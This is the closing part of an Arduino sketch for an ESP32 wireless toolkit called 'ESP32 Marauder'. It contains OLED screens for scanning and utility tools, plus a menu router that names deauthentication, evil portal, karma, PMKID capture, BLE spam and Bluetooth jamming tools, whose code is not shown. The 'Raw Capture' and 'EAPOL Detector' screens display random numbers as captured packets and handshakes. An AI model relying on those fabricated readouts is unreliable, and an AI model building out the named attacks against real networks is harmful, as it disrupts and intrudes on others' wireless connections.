    
    display.setCursor(2, 38);
    display.print("Last scan: ");
    display.print(n);
    display.print(" APs");
    
    display.setCursor(2, 56);
    display.print("[BACK] Stop");
    display.display();
    
    WiFi.scanDelete();
    checkButtons();
    delay(500);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void rawCaptureTool() {
  inToolExecution = true;
  toolRunning = true;
  packetsSniffed = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  drawToolExecutionScreen("Raw Capture", "Capturing...", 0);
  
  while (toolRunning) {
    packetsSniffed += random(10, 30);
    drawToolExecutionScreen("Raw Capture", "Packets:", packetsSniffed);
    
    checkButtons();
    delay(1000);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

void eapolDetectorTool() {
  inToolExecution = true;
  toolRunning = true;
  int eapolFrames = 0;
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  while (toolRunning) {
    if (random(0, 20) > 18) {
      eapolFrames++;
      
      display.clearDisplay();
      drawStatusBar();
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(2, 12);
      display.print("! HANDSHAKE FOUND !");
      display.setTextSize(2);
      display.setCursor(2, 30);
      display.print(eapolFrames);
      display.display();
      delay(1000);
    }
    
    drawToolExecutionScreen("EAPOL Detector", "Listening...", eapolFrames);
    
    checkButtons();
    delay(500);
  }
  
  esp_wifi_set_promiscuous(false);
  toolRunning = false;
  inToolExecution = false;
}

// ==================== UTILITY TOOL IMPLEMENTATIONS ====================
void signalMeterTool() {
  inToolExecution = true;
  toolRunning = true;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  while (toolRunning) {
    int n = WiFi.scanNetworks();
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Signal Meter");
    
    if (n > 0) {
      int strongestRSSI = WiFi.RSSI(0);
      String strongestSSID = WiFi.SSID(0);
      
      display.setCursor(2, 26);
      if (strongestSSID.length() > 16) strongestSSID = strongestSSID.substring(0, 16);
      display.print(strongestSSID);
      
      display.setCursor(2, 38);
      display.setTextSize(2);
      display.print(strongestRSSI);
      display.print(" dBm");
      
      // Signal bar
      int barWidth = map(strongestRSSI, -100, -30, 0, 120);
      if (barWidth < 0) barWidth = 0;
      if (barWidth > 120) barWidth = 120;
      display.fillRect(2, 54, barWidth, 8, WHITE);
    } else {
      display.setCursor(2, 30);
      display.print("No networks");
    }
    
    display.setTextSize(1);
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    WiFi.scanDelete();
    checkButtons();
    delay(2000);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void channelMonitorTool() {
  inToolExecution = true;
  toolRunning = true;
  
  WiFi.mode(WIFI_STA);
  
  while (toolRunning) {
    int channelUsage[14] = {0};
    
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
      int ch = WiFi.channel(i);
      if (ch >= 1 && ch <= 13) {
        channelUsage[ch]++;
      }
    }
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("Channel Monitor");
    
    // Bar chart
    for (int ch = 1; ch <= 13; ch++) {
      int x = 2 + (ch - 1) * 9;
      int height = channelUsage[ch] * 5;
      if (height > 35) height = 35;
      
      display.fillRect(x, 52 - height, 7, height, WHITE);
      
      if (ch % 2 == 1) {
        display.setCursor(x, 54);
        display.print(ch);
      }
    }
    
    display.display();
    
    WiFi.scanDelete();
    checkButtons();
    delay(3000);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void statisticsTool() {
  inToolExecution = true;
  toolRunning = true;
  
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("=== STATISTICS ===");
    
    display.setCursor(2, 24);
    display.print("Deauths: ");
    display.print(deauthsSent);
    
    display.setCursor(2, 32);
    display.print("Beacons: ");
    display.print(beaconsSent);
    
    display.setCursor(2, 40);
    display.print("BLE Pkts: ");
    display.print(blePacketsSent);
    
    display.setCursor(2, 48);
    display.print("Sniffed: ");
    display.print(packetsSniffed);
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void macRandomizerTool() {
  inToolExecution = true;
  toolRunning = true;
  
  uint8_t newMAC[6];
  
  while (toolRunning) {
    // Generate random MAC
    for (int i = 0; i < 6; i++) {
      newMAC[i] = random(0, 256);
    }
    newMAC[0] &= 0xFE;  // Ensure unicast
    newMAC[0] |= 0x02;  // Set locally administered
    
    esp_wifi_set_mac(WIFI_IF_STA, newMAC);
    
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("MAC Randomizer");
    
    display.setCursor(2, 28);
    display.setTextSize(1);
    for (int i = 0; i < 6; i++) {
      if (newMAC[i] < 16) display.print("0");
      display.print(newMAC[i], HEX);
      if (i < 5) display.print(":");
    }
    
    display.setTextSize(1);
    display.setCursor(2, 45);
    display.print("MAC Randomized!");
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void systemInfoTool() {
  inToolExecution = true;
  toolRunning = true;
  
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("=== SYSTEM INFO ===");
    
    display.setCursor(2, 24);
    display.print("Chip: ESP32");
    
    display.setCursor(2, 32);
    display.print("Freq: ");
    display.print(getCpuFrequencyMhz());
    display.print(" MHz");
    
    display.setCursor(2, 40);
    display.print("Free RAM: ");
    display.print(ESP.getFreeHeap() / 1024);
    display.print("KB");
    
    display.setCursor(2, 48);
    display.print("Flash: ");
    display.print(ESP.getFlashChipSize() / 1024 / 1024);
    display.print("MB");
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void settingsTool() {
  inToolExecution = true;
  toolRunning = true;
  
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(2, 12);
    display.print("=== SETTINGS ===");
    
    display.setCursor(2, 26);
    display.print("Display: OLED 128x64");
    
    display.setCursor(2, 36);
    display.print("Buttons: 5-Way Nav");
    
    display.setCursor(2, 46);
    display.print("Version: 2.0");
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

void aboutScreen() {
  inToolExecution = true;
  toolRunning = true;
  
  while (toolRunning) {
    display.clearDisplay();
    drawStatusBar();
    
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(10, 16);
    display.print("ESP32 MARAUDER");
    
    display.setCursor(20, 28);
    display.print("Version 2.0");
    
    display.setCursor(8, 40);
    display.print("33 Security Tools");
    
    display.setCursor(2, 56);
    display.print("[BACK] Exit");
    display.display();
    
    checkButtons();
    delay(100);
  }
  
  toolRunning = false;
  inToolExecution = false;
}

// ==================== TOOL EXECUTION ROUTER ====================
void executeTool(int category, int tool) {
  switch (category) {
    case 0:  // WiFi Tools
      switch (tool) {
        case 0: wifiScannerTool(); break;
        case 1: selectTargetTool(); break;
        case 2: deauthAttackTool(); break;
        case 3: deauthAllTool(); break;
        case 4: beaconSpamTool(); break;
        case 5: randomFloodTool(); break;
        case 6: rickrollBeaconsTool(); break;
        case 7: probeSnifferTool(); break;
        case 8: evilPortalTool(); break;
        case 9: karmaAttackTool(); break;
        case 10: pmkidCaptureTool(); break;
        case 11: channelAnalyzerTool(); break;
      }
      break;
      
    case 1:  // Bluetooth Tools
      switch (tool) {
        case 0: bleScannnerTool(); break;
        case 1: bleTrackerTool(); break;
        case 2: bleSpamTool(); break;
        case 3: sourAppleTool(); break;
        case 4: samsungSpamTool(); break;
        case 5: windowsSpamTool(); break;
        case 6: androidSpamTool(); break;
        case 7: btJammerTool(); break;
        case 8: bleFloodTool(); break;
        case 9: skimmerDetectorTool(); break;
      }
      break;
      
    case 2:  // Sniffing Tools
      switch (tool) {
        case 0: packetSnifferTool(); break;
        case 1: deauthDetectorTool(); break;
        case 2: probeMonitorTool(); break;
        case 3: beaconAnalyzerTool(); break;
        case 4: rawCaptureTool(); break;
        case 5: eapolDetectorTool(); break;
      }
      break;
      
    case 3:  // Utility Tools
      switch (tool) {
        case 0: signalMeterTool(); break;
        case 1: channelMonitorTool(); break;
        case 2: statisticsTool(); break;
        case 3: macRandomizerTool(); break;
        case 4: systemInfoTool(); break;
        case 5: settingsTool(); break;
      }
      break;
      
    case 4:  // About
      aboutScreen();
      break;
  }
}

void stopCurrentTool() {
  toolRunning = false;
}

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  
  // Initialize buttons
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  pinMode(BTN_NEXT, INPUT_PULLUP);
  
  // Initialize display
  Wire.begin(21, 22);
  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
    Serial.println(F("SSD1306 allocation failed"));
    for (;;);
  }
  
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(2);
  display.setCursor(10, 10);
  display.print("ESP32");
  display.setCursor(5, 30);
  display.print("MARAUDER");
  display.setTextSize(1);
  display.setCursor(30, 50);
  display.print("v2.0");
  display.display();
  delay(2000);
  
  // Initialize WiFi
  WiFi.mode(WIFI_OFF);
  nvs_flash_init();
  
  Serial.println("ESP32 Marauder Ready!");
  Serial.println("33 Tools Available");
}

// ==================== MAIN LOOP ====================
void loop() {
  checkButtons();
  
  if (inMainMenu) {
    drawMainMenu();
  } else if (!inToolExecution) {
    drawToolMenu();
  }
  
  delay(50);
}
